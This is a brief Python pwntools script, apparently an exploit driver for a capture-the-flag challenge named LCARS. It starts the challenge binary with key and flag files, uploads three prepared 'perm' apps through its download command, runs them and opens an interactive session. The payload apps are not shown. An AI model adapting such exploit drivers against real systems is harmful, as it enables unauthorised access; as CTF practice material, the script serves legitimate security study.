from pwn import *

args = ['./LCARS', 'init.sys', 'loader.sys', 'echo.sys',
        'crypto.sys', 'svc.papp', 'root.key', 'flag1.papp', 'flag22.txt',
        'flag333.txt']
# args = ['strace', '-f'] + args
r = process(args)

def download(app):
    with open(app) as f:
        blob = f.read()
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

#'''
download('perm.uapp')
download('perm.papp')
download('perm.sapp')
r.sendline('run perm.uapp')
r.sendline('run perm.papp')
r.sendline('run perm.sapp')
#'''

r.interactive()
